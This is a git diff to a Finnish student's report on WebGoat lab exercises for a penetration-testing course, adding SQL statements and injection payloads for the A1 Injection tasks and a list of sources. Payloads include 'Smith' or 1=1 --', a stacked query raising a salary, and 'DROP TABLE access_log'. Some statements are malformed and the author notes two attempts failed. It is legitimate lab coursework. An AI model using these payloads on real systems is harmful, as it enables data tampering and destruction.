@@ -184,20 +184,47 @@ Avasin command execution sivun johon ajoin pari komentoa kuten:
 
 #### A1 Injection
 
+Saatiin tieto mihin osastoon Franco kuuluu
+
+`SELECT department FROM employees WHERE last_name='Franco'`
+ 
 ![image](https://user-images.githubusercontent.com/93308960/200837134-ed1743a4-69e9-47e5-a187-7f3807852d58.png)
+
+Vaihdettiin Barnettin osasto sales
+
+`SELECT department SET employees='sales' WHERE last_name='Barnett'`
 
 ![image](https://user-images.githubusercontent.com/93308960/200837632-2630cded-3981-429f-a064-15c898afa6da.png)
 
+Lisättiin employees tauluun colummi phone 
+
+`ALTER TABLE employees ADD phone varchar(20)`
+
 ![image](https://user-images.githubusercontent.com/93308960/200837872-5ecab5d9-afb5-4e29-880d-ca9a0c199758.png)
+
+Annettiin oikeudet UnauthorizedUser nimiselle käyttäjälle
+
+`GRANT ALTER TABLE TO UnauthorizedUser;`
 
 ![image](https://user-images.githubusercontent.com/93308960/200838160-92c3b63d-80aa-4ed5-aa6a-de7af7656cd4.png)
 
+Lopuissa jouduin katsomaan ohjeita [YouTube](https://www.youtube.com/watch?v=C_-ea63FUto) videosta
+
+`user or 1=1`
+
 ![image](https://user-images.githubusercontent.com/93308960/200838673-9dd75de3-09e3-4fc9-8326-d39940f6a96a.png)
+
+`Smith' or 1=1 --`
 
 ![image](https://user-images.githubusercontent.com/93308960/200839530-eedffe66-8257-4450-a1fb-7a40de0d56e7.png)
 
+Vaikka katsoinki apua en saanut toimimaan kahta vikaa tehtävää.
+
+`3SL99A' ; UPDATE employees SET salary=200000 WHERE auth_tan='3SL99A'`
+
 ![image](https://user-images.githubusercontent.com/93308960/200842622-ac0fc328-68f3-42c0-a7be-d5f58f0b3573.png)
 
+`UPDATE; DROP TABLE access_log`
 
 ![image](https://user-images.githubusercontent.com/93308960/200842522-2ed32fd3-0339-4dca-a626-c2ea76fe032d.png)
 
@@ -343,5 +370,24 @@ Tallensin tiedoston ja sain toimii.
 
 
 
+## Lähteet
 
+https://www.youtube.com/watch?v=oOtJEJvSkoU
 
+https://www.youtube.com/watch?v=oOtJEJvSkoU&t=516s
+
+https://medium.com/@evidencemonday/webgoat-cross-site-request-forgery-solution-1c069985e80f
+
+https://www.synopsys.com/glossary/what-is-cross-site-scripting.html
+
+https://brightsec.com/blog/xss-attack/
+
+https://terokarvinen.com/2022/tunkeutumistestaus-ict4tn027-3010-syksylla-2022/
+
+https://www.youtube.com/watch?v=UXtxfka2TuY
+
+https://www.w3schools.com/tags/att_form_enctype.asp
+
+https://www.w3schools.com/sql/sql_injection.asp
+
+https://www.youtube.com/watch?v=C_-ea63FUto
